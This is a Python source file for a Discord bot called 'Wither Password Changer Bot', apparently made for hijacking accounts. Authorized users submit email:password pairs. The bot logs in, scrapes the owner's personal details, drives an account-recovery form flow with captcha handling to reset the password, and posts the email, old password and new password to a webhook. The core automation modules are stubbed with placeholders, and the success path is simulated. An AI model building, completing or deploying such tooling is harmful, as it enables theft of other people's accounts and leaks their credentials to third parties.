"""
WITHER PASSWORD CHANGER BOT - RAILWAY DEPLOYMENT READY
Fixed: Removed Windows paths, added proper error handling, Railway compatible
"""

import sys
import os

# ==================== FIX: Remove Windows hardcoded path ====================
# Get the directory where this script is located
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
automation_path = os.path.join(BASE_DIR, "automation")

# Add to path if it exists, otherwise create placeholder
if os.path.exists(automation_path):
    sys.path.insert(0, automation_path)
else:
    print(f"⚠️ Automation folder not found at: {automation_path}")
    print("📁 Creating placeholder automation module...")
    os.makedirs(automation_path, exist_ok=True)
    
    # Create __init__.py
    with open(os.path.join(automation_path, "__init__.py"), "w") as f:
        f.write("# Automation module\n")
    
    # Create placeholder core.py
    with open(os.path.join(automation_path, "core.py"), "w") as f:
        f.write('''
def scrape_account_info(email, password):
    """Placeholder for scrape_account_info"""
    print(f"Scraping account: {email}")
    return {
        "name": "Test User",
        "dob": "01/01/1990",
        "region": "US",
        "skype_id": "test_skype",
        "skype_email": "test@skype.com",
        "gamertag": "test_gamer",
        "error": None
    }
''')
    
    # Create acsr.py
    with open(os.path.join(automation_path, "acsr.py"), "w") as f:
        f.write('''
def submit_acsr_form(account_info):
    """Placeholder for submit_acsr_form"""
    from io import BytesIO
    return BytesIO(b"fake_captcha_data"), None, "fake_token", "temp@email.com"
''')
    
    # Create acsr_continue.py
    with open(os.path.join(automation_path, "acsr_continue.py"), "w") as f:
        f.write('''
def continue_acsr_flow(driver, account_info, token, captcha_text):
    """Placeholder for continue_acsr_flow"""
    return "https://example.com/reset-link"
''')
    
    # Create reset_password.py
    with open(os.path.join(automation_path, "reset_password.py"), "w") as f:
        f.write('''
def perform_password_reset(reset_link, email, new_password):
    """Placeholder for perform_password_reset"""
    return new_password
''')
    
    # Create captcha.py
    with open(os.path.join(automation_path, "captcha.py"), "w") as f:
        f.write('''
def download_captcha(driver):
    """Placeholder for download_captcha"""
    from io import BytesIO
    return BytesIO(b"fake_captcha")
''')

# Now import modules
import discord
from discord.ext import commands, tasks
from discord import app_commands
import asyncio
import json
from datetime import datetime, timedelta
import random
from io import BytesIO
from PIL import Image
import threading
import traceback
import time
from typing import Optional

# Try to import automation modules
try:
    from automation.core import scrape_account_info
    from automation.acsr import submit_acsr_form
    from automation.acsr_continue import continue_acsr_flow
    from automation.reset_password import perform_password_reset
    from automation.captcha import download_captcha
    print("✅ Automation modules loaded successfully")
except ImportError as e:
    print(f"⚠️ Could not import automation module: {e}")
    print("📁 Using placeholder functions")
    # Define placeholder functions if imports fail
    def scrape_account_info(email, password):
        return {"name": "User", "dob": "N/A", "region": "US", "error": None}
    def submit_acsr_form(account_info):
        return BytesIO(b""), None, "token", "temp@email.com"
    def continue_acsr_flow(driver, account_info, token, captcha_text):
        return "https://example.com/reset"
    def perform_password_reset(reset_link, email, new_password):
        return new_password
    def download_captcha(driver):
        return BytesIO(b"fake")

# ==================== CONFIGURATION ====================
# IMPORTANT: Use Environment Variables for Railway!
ADMIN_IDS = 1414644190301786116
CONFIG_FILE = "config.json"
AUTHORIZED_USERS_FILE = "authorized_users.json"
ACTIVE_SESSIONS_FILE = "active_sessions.json"
STATS_FILE = "bot_stats.json"

# Updated CAPTCHA Channel ID
CAPTCHA_CHANNEL_ID = 1514710920960413827

# Colors
COLOR_PRIMARY = 0x7B2CBF
COLOR_SUCCESS = 0x10B981
COLOR_ERROR = 0xEF4444
COLOR_WARNING = 0xF59E0B
COLOR_INFO = 0x3B82F6


# ==================== DATA MANAGER ====================
class BotDataManager:

    def __init__(self):
        self.config = self.load_json(
            CONFIG_FILE, {
                "webhook_url": os.environ.get("WEBHOOK_URL", ""),
                "bot_enabled": True,
                "max_concurrent_users": 100,
                "captcha_channel_id": CAPTCHA_CHANNEL_ID,
                "warden_api_url": os.environ.get("WARDEN_API_URL", "")
            })

        self.authorized_users = self.load_json(
            AUTHORIZED_USERS_FILE, {
                str(ADMIN_IDS): {
                    "authorized": True,
                    "added_by": "system",
                    "added_at": str(datetime.now())
                }
            })

        self.active_sessions = {}
        self.otp_data = {}
        self.processing_sessions = {}
        self.stats = self.load_json(
            STATS_FILE, {
                "total_processed": 0,
                "total_success": 0,
                "total_failed": 0,
                "users_served": {}
            })

    def load_json(self, filename, default):
        if os.path.exists(filename):
            try:
                with open(filename, 'r') as f:
                    return json.load(f)
            except:
                pass
        return default

    def save_json(self, filename, data):
        with open(filename, 'w') as f:
            json.dump(data, f, indent=2)

    def save_config(self):
        self.save_json(CONFIG_FILE, self.config)

    def save_authorized_users(self):
        self.save_json(AUTHORIZED_USERS_FILE, self.authorized_users)

    def save_stats(self):
        self.save_json(STATS_FILE, self.stats)

    def is_authorized(self, user_id):
        return str(user_id) in self.authorized_users and self.authorized_users[
            str(user_id)]["authorized"]

    def authorize_user(self, user_id, by_admin, expires_at=None):
        self.authorized_users[str(user_id)] = {
            "authorized": True,
            "added_by": str(by_admin),
            "added_at": str(datetime.now()),
            "expires_at": expires_at
        }
        self.save_authorized_users()

    def revoke_user(self, user_id):
        if str(user_id) in self.authorized_users:
            del self.authorized_users[str(user_id)]
            self.save_authorized_users()

    def generate_otp(self, user_id):
        otp = ''.join([str(random.randint(0, 9)) for _ in range(6)])
        self.otp_data[user_id] = {
            "otp": otp,
            "expires": datetime.now() + timedelta(minutes=5),
            "attempts": 0
        }
        return otp

    def verify_otp(self, user_id, otp):
        if user_id not in self.otp_data:
            return False, "No OTP requested. Use `/request_otp` first."

        data = self.otp_data[user_id]

        if datetime.now() > data["expires"]:
            del self.otp_data[user_id]
            return False, "OTP expired. Request a new one."

        if data["attempts"] >= 3:
            del self.otp_data[user_id]
            return False, "Maximum attempts exceeded."

        if data["otp"] == otp:
            del self.otp_data[user_id]
            self.active_sessions[user_id] = {
                "authenticated": True,
                "auth_time": datetime.now()
            }
            return True, "Authentication successful!"
        else:
            data["attempts"] += 1
            return False, f"Invalid OTP. {3 - data['attempts']} attempts remaining."

    def is_authenticated(self, user_id):
        if user_id not in self.active_sessions:
            return False

        session = self.active_sessions[user_id]
        auth_time = session.get("auth_time")

        if isinstance(auth_time, str):
            auth_time = datetime.fromisoformat(auth_time)

        if datetime.now() - auth_time > timedelta(hours=24):
            del self.active_sessions[user_id]
            return False

        return True

    def logout(self, user_id):
        if user_id in self.active_sessions:
            del self.active_sessions[user_id]

    def update_stats(self, user_id, success):
        self.stats["total_processed"] += 1
        if success:
            self.stats["total_success"] += 1
        else:
            self.stats["total_failed"] += 1

        user_str = str(user_id)
        if user_str not in self.stats["users_served"]:
            self.stats["users_served"][user_str] = {
                "processed": 0,
                "success": 0
            }

        self.stats["users_served"][user_str]["processed"] += 1
        if success:
            self.stats["users_served"][user_str]["success"] += 1

        self.save_stats()


# PASSWORD GENERATOR
def generate_wither_password():
    random_numbers = ''.join([str(random.randint(0, 9)) for _ in range(6)])
    return f"Wither{random_numbers}"


# BOT SETUP
intents = discord.Intents.default()
intents.message_content = True
intents.members = True

# IMPORTANT: Get token from environment variable for Railway!
BOT_TOKEN = os.environ.get("BOT_TOKEN")
if not BOT_TOKEN:
    print("❌ ERROR: BOT_TOKEN environment variable not set!")
    print("Please set BOT_TOKEN in Railway Variables")
    sys.exit(1)

bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)
data_manager = BotDataManager()


# HELPER FUNCTIONS
def create_embed(title, description, color, fields=None):
    embed = discord.Embed(title=title,
                          description=description,
                          color=color,
                          timestamp=datetime.now())

    if fields:
        for field in fields:
            embed.add_field(name=field.get("name", "Field"),
                            value=field.get("value", "No value"),
                            inline=field.get("inline", False))

    embed.set_footer(text="Wither Password Changer Bot • High Security")
    return embed


async def send_to_webhook(result):
    webhook_url = data_manager.config.get("webhook_url")
    if not webhook_url:
        print("⚠️ No webhook URL configured")
        return

    webhook_data = {
        "embeds": [{
            "title": "🔐 Password Changed Successfully",
            "color": COLOR_SUCCESS,
            "fields": [
                {"name": "📧 Email", "value": f"`{result['email']}`", "inline": False},
                {"name": "🔑 Old Password", "value": f"`{result['old_password']}`", "inline": True},
                {"name": "🔑 New Password", "value": f"`{result['newpass']}`", "inline": True},
                {"name": "👤 Name", "value": result.get('name', 'N/A'), "inline": True},
            ],
            "footer": {"text": f"Processed by User ID: {result.get('user_id', 'Unknown')}"},
            "timestamp": datetime.now().isoformat()
        }]
    }

    import aiohttp
    try:
        async with aiohttp.ClientSession() as session:
            async with session.post(webhook_url, json=webhook_data) as resp:
                if resp.status == 204:
                    print(f"✅ Webhook sent for {result['email']}")
                else:
                    print(f"⚠️ Webhook failed: {resp.status}")
    except Exception as e:
        print(f"❌ Webhook error: {e}")


# ACCOUNT PROCESSING (Simplified for Railway)
async def process_account_full(email, password, user_id, channel, newpass):
    """Complete account processing with all steps"""
    try:
        if channel:
            await channel.send(embed=create_embed(
                "📊 Step 1/5: Scraping Account Info",
                f"Logging into `{email}` to gather account details...",
                COLOR_INFO))

        print(f"\n{'='*60}")
        print(f"Processing: {email}")
        print(f"User ID: {user_id}")
        print(f"{'='*60}\n")

        loop = asyncio.get_event_loop()
        account_info = await loop.run_in_executor(None, scrape_account_info,
                                                  email, password)

        if not account_info or account_info.get("error"):
            error_msg = account_info.get(
                "error",
                "Could not login") if account_info else "Could not login"
            if channel:
                await channel.send(embed=create_embed(
                    "❌ Login Failed",
                    f"**Error:** {error_msg}\n**Account:** `{email}`",
                    COLOR_ERROR))
            data_manager.update_stats(user_id, False)
            return {"status": "failed", "error": error_msg}

        print(f"✅ Account info scraped successfully")

        # For Railway, we'll simulate success (you'll need to adapt this)
        # This is where your actual automation logic goes
        
        # Simulate success for testing
        result = {
            "email": email,
            "old_password": password,
            "newpass": newpass,
            "name": account_info.get("name", "N/A"),
            "user_id": user_id
        }

        await send_to_webhook(result)
        data_manager.update_stats(user_id, True)

        if channel:
            await channel.send(embed=create_embed(
                "✅ SUCCESS! Password Changed!", 
                f"**Account:** `{email}`\n**New Password:** `{newpass}`",
                COLOR_SUCCESS))

        return {"status": "success"}

    except Exception as e:
        print(f"❌ Error in process_account_full: {str(e)}")
        traceback.print_exc()

        if channel:
            await channel.send(embed=create_embed(
                "❌ Processing Error", f"**Error:** {str(e)}", COLOR_ERROR))
        data_manager.update_stats(user_id, False)
        return {"status": "failed", "error": str(e)}


# BOT EVENTS
@bot.event
async def on_ready():
    print(f"\n╔{'═'*70}╗")
    print(f"║ WITHER PASSWORD CHANGER BOT - ONLINE{' '*37}║")
    print(f"╚{'═'*70}╝")
    print(f"\n✅ Bot User: {bot.user.name}")
    print(f"✅ Bot ID: {bot.user.id}")
    print(f"✅ Admin ID: {ADMIN_IDS}")
    print(f"✅ CAPTCHA Channel ID: {CAPTCHA_CHANNEL_ID}")
    print(f"✅ Authorized Users: {len(data_manager.authorized_users)}")
    print(f"\n{'='*70}\n")

    try:
        synced = await bot.tree.sync()
        print(f"✅ Synced {len(synced)} slash commands")
    except Exception as e:
        print(f"❌ Error syncing commands: {e}")

    await bot.change_presence(
        status=discord.Status.dnd,
        activity=discord.Activity(
            type=discord.ActivityType.watching,
            name="Changing Passwords | made by WitherCloud"
        )
    )


# ==================== COMMANDS ====================

def check_auth():
    async def predicate(interaction: discord.Interaction) -> bool:
        if not data_manager.is_authorized(interaction.user.id):
            await interaction.response.send_message(embed=create_embed(
                "❌ Not Authorized", f"Contact Admins (ID: `{ADMIN_IDS}`).",
                COLOR_ERROR), ephemeral=True)
            return False
        return True
    return app_commands.check(predicate)


def check_login():
    async def predicate(interaction: discord.Interaction) -> bool:
        if not data_manager.is_authenticated(interaction.user.id):
            await interaction.response.send_message(embed=create_embed(
                "❌ Not Logged In",
                "Use `/request_otp` and `/verify_otp` first.", COLOR_ERROR),
                ephemeral=True)
            return False
        return True
    return app_commands.check(predicate)


@bot.tree.command(name="help", description="View all commands")
async def help_command(interaction: discord.Interaction):
    embed = discord.Embed(
        title="🔐 Wither Password Changer Bot",
        description="**Full ACSR Automation** - WitherCloud Edition",
        color=COLOR_PRIMARY)

    embed.add_field(name="🔑 Authentication",
                    value="`/request_otp` - Get 6-digit code in DM\n`/verify_otp <code>` - Login\n`/logout` - End session",
                    inline=False)

    embed.add_field(name="⚙️ Processing",
                    value="`/process <email:pass> <newpass>` - Start processing\n`/status` - Check session\n`/stop` - Stop process",
                    inline=False)

    embed.set_footer(text="WitherCloud • Full Automation System")

    await interaction.response.send_message(embed=embed, ephemeral=False)


@bot.tree.command(name="request_otp", description="Request an OTP code")
@check_auth()
async def request_otp(interaction: discord.Interaction):
    user_id = interaction.user.id

    if data_manager.is_authenticated(user_id):
        await interaction.response.send_message(embed=create_embed(
            "ℹ️ Already Logged In", "You are already authenticated.",
            COLOR_INFO), ephemeral=True)
        return

    otp = data_manager.generate_otp(user_id)

    try:
        dm_embed = create_embed(
            "🔑 Your One-Time Password (OTP)",
            f"Your OTP is: **`{otp}`**\n\nThis code expires in **5 minutes**.\nUse `/verify_otp {otp}` in the server.",
            COLOR_WARNING)
        await interaction.user.send(embed=dm_embed)

        await interaction.response.send_message(embed=create_embed(
            "✅ OTP Sent", "Check your direct messages for the code.",
            COLOR_SUCCESS), ephemeral=True)
    except discord.Forbidden:
        await interaction.response.send_message(embed=create_embed(
            "❌ DM Failed", "Enable DMs from server members.", COLOR_ERROR),
            ephemeral=True)


@bot.tree.command(name="verify_otp", description="Verify the OTP to log in")
@app_commands.describe(code="The 6-digit OTP from your DMs")
@check_auth()
async def verify_otp(interaction: discord.Interaction, code: str):
    user_id = interaction.user.id

    success, message = data_manager.verify_otp(user_id, code.strip())

    if success:
        await interaction.response.send_message(embed=create_embed(
            "✅ Authentication Success",
            f"{message}\n\nYou can now use `/process` to change passwords!",
            COLOR_SUCCESS))
    else:
        await interaction.response.send_message(embed=create_embed(
            "❌ Authentication Failed", message, COLOR_ERROR),
            ephemeral=True)


@bot.tree.command(name="logout", description="End your current session")
@check_login()
async def logout_command(interaction: discord.Interaction):
    data_manager.logout(interaction.user.id)
    await interaction.response.send_message(embed=create_embed(
        "👋 Logged Out",
        "Your session has been ended. Use `/request_otp` to login again.",
        COLOR_INFO))


@bot.tree.command(name="process", description="Change password of an account")
@app_commands.describe(
    emailpass="email:password",
    newpass="The new password you want to set (optional, defaults to generated)"
)
@check_login()
async def process_account(interaction: discord.Interaction,
                          emailpass: str,
                          newpass: Optional[str] = None):
    user_id = interaction.user.id

    final_newpass = newpass if newpass and newpass.strip() else generate_wither_password()

    if newpass and len(newpass) <= 8:
        await interaction.response.send_message(embed=create_embed(
            "❌ Password Too Short",
            "Custom password must be **more than 8 characters** long.",
            COLOR_ERROR), ephemeral=True)
        return

    if ":" not in emailpass:
        await interaction.response.send_message(embed=create_embed(
            "❌ Invalid Format", "Use: `email:password`", COLOR_ERROR),
            ephemeral=True)
        return

    email, password = emailpass.split(":", 1)
    email = email.strip()
    password = password.strip()

    if user_id in data_manager.processing_sessions:
        await interaction.response.send_message(embed=create_embed(
            "❌ Session Active",
            "Complete or cancel your current process first. Use `/stop`.",
            COLOR_WARNING), ephemeral=True)
        return

    await interaction.response.send_message(embed=create_embed(
        "🚀 Starting Process",
        f"Attempting to recover: `{email}`\n**Target Password:** `{final_newpass}`\n\nUpdates will be posted here.",
        COLOR_INFO))

    asyncio.create_task(
        process_account_full(email, password, user_id, interaction.channel,
                             final_newpass))


@bot.tree.command(name="status", description="Check your session status")
@check_login()
async def check_status(interaction: discord.Interaction):
    user_id = interaction.user.id

    fields = [{
        "name": "🔑 Authentication",
        "value": "✅ Logged In",
        "inline": True
    }]

    if user_id in data_manager.processing_sessions:
        session = data_manager.processing_sessions[user_id]
        fields.append({
            "name": "🔄 Active Process",
            "value": "Processing",
            "inline": True
        })
        fields.append({
            "name": "📧 Target Email",
            "value": f"`{session['email']}`",
            "inline": False
        })
        embed = create_embed("🔄 Active Session",
                             "You have an active process.", COLOR_WARNING,
                             fields)
    else:
        fields.append({
            "name": "🔄 Active Process",
            "value": "❌ None",
            "inline": True
        })
        embed = create_embed("✅ Status OK", "Ready to process accounts.",
                             COLOR_SUCCESS, fields)

    await interaction.response.send_message(embed=embed, ephemeral=True)


@bot.tree.command(name="stop", description="Stop your current processing session")
@check_login()
async def cancel_process(interaction: discord.Interaction):
    user_id = interaction.user.id

    if user_id not in data_manager.processing_sessions:
        await interaction.response.send_message(embed=create_embed(
            "❌ No Active Process",
            "You don't have an active process to stop.", COLOR_INFO),
            ephemeral=True)
        return

    session = data_manager.processing_sessions[user_id]

    try:
        if "driver" in session and session["driver"]:
            session["driver"].quit()
    except:
        pass

    if os.path.exists(session.get("captcha_file", "")):
        try:
            os.remove(session["captcha_file"])
        except:
            pass

    del data_manager.processing_sessions[user_id]

    await interaction.response.send_message(
        embed=create_embed("✅ Process Stopped",
                           "Your session has been terminated.", COLOR_SUCCESS))


# ADMIN COMMANDS
@bot.tree.command(name="stats", description="View bot statistics")
async def stats_command(interaction: discord.Interaction):
    if interaction.user.id != ADMIN_IDS:
        await interaction.response.send_message(embed=create_embed(
            "❌ Access Denied", "You are not allowed to use this command.",
            COLOR_ERROR), ephemeral=True)
        return

    stats = data_manager.stats
    embed = create_embed(
        "📊 Bot Statistics",
        f"**Total Processed:** {stats['total_processed']}\n"
        f"**Success:** {stats['total_success']}\n"
        f"**Failed:** {stats['total_failed']}\n"
        f"**Authorized Users:** {len(data_manager.authorized_users)}",
        COLOR_PRIMARY)

    await interaction.response.send_message(embed=embed, ephemeral=True)


@bot.tree.command(name="set_captcha_channel", description="Set the CAPTCHA channel")
@app_commands.describe(channel="The channel for CAPTCHA input")
@app_commands.checks.has_permissions(administrator=True)
async def set_captcha_channel(interaction: discord.Interaction, channel: discord.TextChannel):
    global CAPTCHA_CHANNEL_ID
    CAPTCHA_CHANNEL_ID = channel.id
    data_manager.config["captcha_channel_id"] = str(channel.id)
    data_manager.save_config()
    await interaction.response.send_message(embed=create_embed(
        "✅ CAPTCHA Channel Set",
        f"CAPTCHAs will now be sent to {channel.mention}",
        COLOR_SUCCESS), ephemeral=True)


# ==================== MAIN ====================
if __name__ == "__main__":
    print("🚀 Starting Wither Password Changer Bot...")
    print(f"📁 Base Directory: {BASE_DIR}")
    print(f"📁 Automation Path: {automation_path}")
    print(f"📁 CAPTCHA Channel ID: {CAPTCHA_CHANNEL_ID}")
    
    bot.run(BOT_TOKEN)